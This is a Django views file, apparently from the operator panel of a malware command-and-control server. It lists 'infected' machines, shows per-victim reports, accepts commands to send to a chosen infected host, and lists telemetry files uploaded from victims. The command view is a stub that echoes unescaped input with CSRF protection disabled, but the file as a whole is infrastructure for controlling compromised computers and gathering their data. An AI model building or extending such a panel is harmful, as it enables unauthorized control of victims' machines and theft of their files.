from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.http import HttpRequest, HttpResponse

import os
from pathlib import Path
from datetime import datetime

# Create your views here.
from api.models import Instancia

def dashboard(request: HttpRequest):
    infectados = Instancia.objects.count()
    return render(request, "web/dashboard.html", {"infectados": infectados})

def user_list(request: HttpRequest):
    infectados = Instancia.objects.all()
    return render(request, "web/user_list.html", {"infectados": infectados})

def user_report(request: HttpRequest, infectado):
    infectado = Instancia.objects.get(pk=infectado)
    return render(request, "web/user_report.html", {"infectado": infectado})

def user_control(request: HttpRequest):
    infectados = Instancia.objects.all()
    return render(request, "web/user_control.html", {"infectados": infectados})

@csrf_exempt
def user_control_instance(request: HttpRequest, infectado):
    infectado = Instancia.objects.get(pk=infectado)
    if request.method == "POST":
        return HttpResponse(f'<p style="margin-bottom: -6px;">[{request.user.username}] {request.POST.get("command", "NADA")}</p>')
    return render(request, "web/user_control_instance.html", {"infectado": infectado})

# TODO : permitir descargar un archivo, de ser posible usar StreamingHttpResponse
def telemetry(request: HttpRequest):
    archivos = []
    # TODO : tomar el uuid / key para saber quien lo subio y mostrarlo
    for entry in Path("telemetry").iterdir():
        archivo = entry.stat()
        archivos.append([entry.name, entry.suffix, f'{archivo.st_size} KB', datetime.fromtimestamp(archivo.st_ctime).strftime("%d/%m/%Y, %H:%M")])
    return render(request, "web/telemetry.html", {"archivos": archivos})
